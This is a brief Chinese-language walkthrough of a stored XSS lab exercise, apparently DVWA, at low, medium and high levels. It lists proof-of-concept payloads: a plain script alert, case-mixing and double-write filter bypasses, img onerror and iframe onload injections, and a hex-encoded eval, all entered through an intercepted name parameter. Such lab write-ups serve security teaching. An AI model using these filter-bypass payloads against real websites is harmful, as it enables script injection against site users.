# XSS (Stored)

> ## low

最简单的xss

```javascript
<script>alert('low')</script>
```

<br>

> ## medium

使用BurpSuite抓包，修改name参数

1.使用大小写绕过：

```js
<ScRipt>alert(/medium/);</ScRipt>
```



2.使用双写绕过：

```js
<scr<script>ipt>alert('xss');</script>
```



3.使用非 script 标签

img标签：

```
<img src=1 onerror=alert('medium')>

<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
```

iframe标签：

```
<iframe onload=alert(1)>
```

<br>

> ## high
>

使用非 script 标签注入

使用BurpSuite抓包，修改name参数

img标签：

```
<img src=1 onerror=alert('xss')>

<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
```

iframe标签：

```
<iframe onload=alert(1)>
```

<br>



更多方法待补充